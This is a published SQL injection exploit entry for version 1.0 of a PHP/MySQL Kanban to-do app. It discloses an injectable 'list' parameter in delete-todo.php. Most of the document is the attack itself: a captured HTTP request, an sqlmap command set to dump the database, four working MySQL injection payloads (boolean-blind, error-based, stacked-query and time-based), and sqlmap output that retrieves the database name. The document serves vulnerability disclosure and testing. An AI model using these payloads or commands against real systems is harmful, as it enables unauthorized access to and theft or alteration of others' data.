# To Do List App - SQL Injection
+ **Exploit Title:**  To Do List App - SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17259/todo-list-kanban-board-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17259&title=Todo+List+in+Kanban+Board+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Repoerted, waiting for CVE number

## Description:
To Do List App 1.0 allows SQL Injection via the 'list' parameter in "/todo-list-in-kanban-board/endpoint/delete-todo.php?list=5". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/todo-list-in-kanban-board/"
+ Select any resident and press the delete-list button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /todo-list-in-kanban-board/endpoint/delete-todo.php?list=5 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'list' parameter to dump the database.
```
sqlmap -r r.txt -p list --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: list (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: list=5' RLIKE (SELECT (CASE WHEN (5950=5950) THEN 5 ELSE 0x28 END))-- pCgV

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: list=5' AND EXTRACTVALUE(1256,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(1256=1256,1))),0x71706a6a71))-- gqeJ

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: list=5';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: list=5' AND (SELECT 8378 FROM (SELECT(SLEEP(5)))JsKw)-- NdVF
---
[07:23:43] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[07:23:43] [INFO] fetching current database
[07:23:43] [INFO] retrieved: 'todo_kanban_db'
current database: 'todo_kanban_db'
```
+ current database: `todo_kanban_db`

![Ekran görüntüsü 2024-03-26 142845](https://github.com/BurakSevben/CVEs/assets/117217689/f3a2ad6f-70a5-4abd-83e4-acbb6f1553a0)
